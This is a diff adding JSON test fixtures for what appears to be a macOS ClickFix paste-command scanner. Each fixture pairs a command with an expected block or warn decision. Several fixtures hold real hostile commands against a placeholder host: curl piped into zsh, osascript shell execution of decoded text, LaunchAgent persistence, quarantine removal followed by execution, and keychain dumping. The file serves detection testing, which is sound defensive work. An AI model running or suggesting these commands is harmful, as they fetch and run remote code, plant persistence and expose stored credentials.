+  },
+  {
+    "fixture_id": "CF-STAGE-005",
+    "name": "Download then dot-source",
+    "category": "staging",
+    "description": "Download then dot-source supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix -o /tmp/msaa-source ; . /tmp/msaa-source",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "download_stage_execute",
+      "downloaded_content_sourced"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-STAGE-006",
+    "name": "Fileless temporary pipe",
+    "category": "staging",
+    "description": "Fileless temporary pipe supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix | tee /tmp/msaa-stage | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-AS-001",
+    "name": "osascript shell execution",
+    "category": "applescript",
+    "description": "osascript shell execution supplied only as inert scanner data.",
+    "command_text": "osascript -e 'do shell script \"curl -fsSL https://example.invalid/fix | zsh\"' ",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "applescript_shell_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-AS-002",
+    "name": "AppleScript encoded shell text",
+    "category": "applescript",
+    "description": "AppleScript encoded shell text supplied only as inert scanner data.",
+    "command_text": "osascript -e 'do shell script \"printf cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1Rcbic= | base64 -D | zsh\"' ",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "applescript_shell_execution",
+      "decoded_content_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-AS-003",
+    "name": "AppleScript URL scheme",
+    "category": "applescript",
+    "description": "AppleScript URL scheme supplied only as inert scanner data.",
+    "command_text": "applescript://SAFE_TEST_PLACEHOLDER",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "applescript_url_scheme"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-AS-004",
+    "name": "Script Editor execution observation",
+    "category": "applescript",
+    "description": "Script Editor execution observation supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_SCRIPT_EDITOR_TO_SHELL>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "script_editor_to_shell",
+      "clickfix_terminal_bypass"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "script_editor_to_shell",
+      "clickfix_terminal_bypass"
+    ]
+  },
+  {
+    "fixture_id": "CF-AS-005",
+    "name": "open AppleScript URL",
+    "category": "applescript",
+    "description": "open AppleScript URL supplied only as inert scanner data.",
+    "command_text": "open 'applescript://SAFE_TEST_PLACEHOLDER'",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "applescript_url_scheme"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PERSIST-001",
+    "name": "LaunchAgent path creation",
+    "category": "persistence",
+    "description": "LaunchAgent path creation supplied only as inert scanner data.",
+    "command_text": "printf '<SAFE_PLIST_PLACEHOLDER>' > \"$HOME/Library/LaunchAgents/com.example.invalid.test.plist\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "launchagent_write"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PERSIST-002",
+    "name": "Downloaded LaunchAgent",
+    "category": "persistence",
+    "description": "Downloaded LaunchAgent supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/test.plist -o \"$HOME/Library/LaunchAgents/com.example.invalid.test.plist\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "downloaded_persistence",
+      "launchagent_write"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PERSIST-003",
+    "name": "LaunchAgent bootstrap",
+    "category": "persistence",
+    "description": "LaunchAgent bootstrap supplied only as inert scanner data.",
+    "command_text": "launchctl bootstrap \"gui/$UID\" \"$HOME/Library/LaunchAgents/com.example.invalid.test.plist\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "persistence_activation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PERSIST-004",
+    "name": "Download and activate persistence",
+    "category": "persistence",
+    "description": "Download and activate persistence supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/test.plist -o \"$HOME/Library/LaunchAgents/com.example.invalid.test.plist\" ; launchctl bootstrap \"gui/$UID\" \"$HOME/Library/LaunchAgents/com.example.invalid.test.plist\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "downloaded_persistence",
+      "persistence_activation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PERSIST-005",
+    "name": "Cron placeholder",
+    "category": "persistence",
+    "description": "Cron placeholder supplied only as inert scanner data.",
+    "command_text": "crontab - <SAFE_CRON_PLACEHOLDER>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "persistence_creation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BYPASS-001",
+    "name": "Quarantine removal",
+    "category": "security_bypass",
+    "description": "Quarantine removal supplied only as inert scanner data.",
+    "command_text": "xattr -d com.apple.quarantine /tmp/example.invalid.app",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "security_control_weakening"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BYPASS-002",
+    "name": "Recursive quarantine removal",
+    "category": "security_bypass",
+    "description": "Recursive quarantine removal supplied only as inert scanner data.",
+    "command_text": "xattr -dr com.apple.quarantine /tmp/example.invalid.app",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "security_control_weakening"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BYPASS-003",
+    "name": "Download quarantine removal execute",
+    "category": "security_bypass",
+    "description": "Download quarantine removal execute supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/app -o /tmp/example.invalid.app ; xattr -dr com.apple.quarantine /tmp/example.invalid.app ; /tmp/example.invalid.app",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "security_control_weakening"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BYPASS-004",
+    "name": "Gatekeeper disable intent",
+    "category": "security_bypass",
+    "description": "Gatekeeper disable intent supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_DISABLE_GATEKEEPER>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "gatekeeper_disable_intent",
+      "destructive_security_change"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BYPASS-005",
+    "name": "SIP disable intent",
+    "category": "security_bypass",
+    "description": "SIP disable intent supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_DISABLE_SIP>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "sip_disable_intent",
+      "destructive_security_change"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BYPASS-006",
+    "name": "TCC modification intent",
+    "category": "security_bypass",
+    "description": "TCC modification intent supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_MODIFY_TCC_DATABASE>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "tcc_tampering_intent"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DESTRUCT-001",
+    "name": "Delete Root Filesystem",
+    "category": "destructive_symbolic",
+    "description": "Delete Root Filesystem supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_DELETE_ROOT_FILESYSTEM>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "destructive_filesystem_intent"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DESTRUCT-002",
+    "name": "Delete User Home",
+    "category": "destructive_symbolic",
+    "description": "Delete User Home supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_DELETE_USER_HOME>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "destructive_filesystem_intent"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DESTRUCT-003",
+    "name": "Erase System Volume",
+    "category": "destructive_symbolic",
+    "description": "Erase System Volume supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_ERASE_SYSTEM_VOLUME>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "destructive_disk_intent"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DESTRUCT-004",
+    "name": "Overwrite Disk Device",
+    "category": "destructive_symbolic",
+    "description": "Overwrite Disk Device supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_OVERWRITE_DISK_DEVICE>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "raw_disk_write_intent"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DESTRUCT-005",
+    "name": "Recursive Permission Destruction",
+    "category": "destructive_symbolic",
+    "description": "Recursive Permission Destruction supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_RECURSIVE_PERMISSION_DESTRUCTION>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "destructive_permission_change"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DESTRUCT-006",
+    "name": "Disable Security Controls And Delete Data",
+    "category": "destructive_symbolic",
+    "description": "Disable Security Controls And Delete Data supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_DISABLE_SECURITY_CONTROLS_AND_DELETE_DATA>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "compound_destructive_intent"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DESTRUCT-007",
+    "name": "Fork Or Resource Exhaustion",
+    "category": "destructive_symbolic",
+    "description": "Fork Or Resource Exhaustion supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_FORK_OR_RESOURCE_EXHAUSTION>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "denial_of_service_intent"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DESTRUCT-008",
+    "name": "Mass Process Termination",
+    "category": "destructive_symbolic",
+    "description": "Mass Process Termination supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_MASS_PROCESS_TERMINATION>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "destructive_process_control"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-CRED-001",
+    "name": "Credential intent 001",
+    "category": "credential_access",
+    "description": "Credential intent 001 supplied only as inert scanner data.",
+    "command_text": "security find-generic-password -w -s example.invalid",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "keychain_secret_output"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-CRED-002",
+    "name": "Credential intent 002",
+    "category": "credential_access",
+    "description": "Credential intent 002 supplied only as inert scanner data.",
+    "command_text": "security dump-keychain",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 6,
+    "required_rule_ids": [
+      "keychain_dump"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-CRED-003",
+    "name": "Credential intent 003",
+    "category": "credential_access",
+    "description": "Credential intent 003 supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_READ_BROWSER_LOGIN_DATABASE>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "browser_credential_access"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-CRED-004",
+    "name": "Credential intent 004",
+    "category": "credential_access",
+    "description": "Credential intent 004 supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_READ_BROWSER_COOKIES>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "browser_cookie_access"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-CRED-005",
+    "name": "Credential intent 005",
+    "category": "credential_access",
+    "description": "Credential intent 005 supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_ARCHIVE_SSH_KEYS>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "ssh_key_collection"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-CRED-006",
+    "name": "Credential intent 006",
+    "category": "credential_access",
+    "description": "Credential intent 006 supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_COLLECT_CLOUD_CREDENTIALS>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "cloud_credential_collection"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-CRED-007",
+    "name": "Credential intent 007",
+    "category": "credential_access",
+    "description": "Credential intent 007 supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_COLLECT_WALLET_DATA>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "wallet_data_collection"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-CRED-008",
+    "name": "Credential intent 008",
+    "category": "credential_access",
+    "description": "Credential intent 008 supplied only as inert scanner data.",
+    "command_text": "<ATTEMPT_ARCHIVE_AND_EXFILTRATE_USER_DATA>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "archive_creation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-DRIVEBY-001",
+    "name": "Drive-by simulation 1",
+    "category": "driveby",
+    "description": "Drive-by simulation 1 supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_DRIVEBY_1>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "browser_to_terminal_transition",
+      "clipboard_to_terminal",
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "Fake browser verification",
+      "Malvertising redirect"
+    ],
+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "browser_to_terminal_transition",
+      "clipboard_to_terminal",
+      "network_to_interpreter"
+    ]
+  },
+  {
+    "fixture_id": "CF-DRIVEBY-002",
+    "name": "Drive-by simulation 2",
+    "category": "driveby",
+    "description": "Drive-by simulation 2 supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_DRIVEBY_2>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "clickfix_social_engineering_context",
+      "trailing_newline"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "Fake browser verification",
+      "Malvertising redirect"
+    ],
+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "clickfix_social_engineering_context",
+      "trailing_newline"
+    ]
+  },
+  {
+    "fixture_id": "CF-DRIVEBY-003",
+    "name": "Drive-by simulation 3",
+    "category": "driveby",
+    "description": "Drive-by simulation 3 supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_DRIVEBY_3>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "malvertising_context",
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "Fake browser verification",
+      "Malvertising redirect"
+    ],
+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "malvertising_context",
+      "network_to_interpreter"
+    ]
+  },
+  {
+    "fixture_id": "CF-DRIVEBY-004",
+    "name": "Drive-by simulation 4",
+    "category": "driveby",
+    "description": "Drive-by simulation 4 supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_DRIVEBY_4>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "crashfix_context",
+      "browser_to_terminal_transition"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "Fake browser verification",
+      "Malvertising redirect"
+    ],
